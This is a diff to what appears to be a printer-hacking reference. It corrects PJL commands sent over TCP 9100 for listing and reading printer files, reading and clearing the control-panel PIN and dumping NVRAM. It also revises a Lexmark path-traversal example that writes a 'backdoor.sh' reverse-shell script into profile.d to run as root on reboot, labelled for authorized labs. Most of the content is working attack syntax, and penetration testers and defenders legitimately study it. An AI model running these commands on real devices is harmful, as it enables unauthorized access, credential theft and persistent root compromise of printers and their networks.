@@ -46,9 +46,10 @@ Send commands via netcat to TCP 9100, or via HTTP POST (field name `pjl`) on man
 |---------|---------|
 | `@PJL INFO ID` | Returns printer model string |
 | `@PJL INFO STATUS` | Current printer status |
-| `@PJL FSDIRLIST NAME="0:" ENTRY=1 COUNT=50` | List printer filesystem root |
-| `@PJL FSUPLOAD NAME="<path>" SIZE=<n>` | Read a file from the printer filesystem |
-| `@PJL FSDOWNLOAD FORMAT:BINARY NAME="<path>" SIZE=<n>` | Write a file |
+| `@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535` | List printer filesystem root |
+| `@PJL FSQUERY NAME="<path>"` | Return size/type of a file (use before FSUPLOAD to size the read) |
+| `@PJL FSUPLOAD NAME="<path>" OFFSET=0 SIZE=<n>` | Read a file from the printer filesystem (OFFSET required per HP PJL spec) |
+| `@PJL FSDOWNLOAD FORMAT:BINARY SIZE=<n> NAME="<path>"` | Write a file (SIZE precedes NAME; body follows the command) |
 | `@PJL INQUIRE CPLOCK` | Read control panel lock PIN |
 | `@PJL NVRAM DUMP` | Dump full NVRAM (HP/Lexmark) |
 | `@PJL SET CPLOCK=0` | Remove control panel PIN |
@@ -83,8 +84,8 @@ On Lexmark devices, path traversal allows writing files to the host filesystem's
 
 ```bash
 # Write a reverse shell init script (authorized lab only)
-@PJL FSDOWNLOAD FORMAT:BINARY NAME="0:/../../rw/var/etc/profile.d/backdoor.sh" SIZE=<n>
-<shell script content>
+@PJL FSDOWNLOAD FORMAT:BINARY SIZE=<n> NAME="0:/../../rw/var/etc/profile.d/backdoor.sh"
+<shell script content of exactly n bytes>
 # On next reboot, the script executes as root during device init
 ```
 
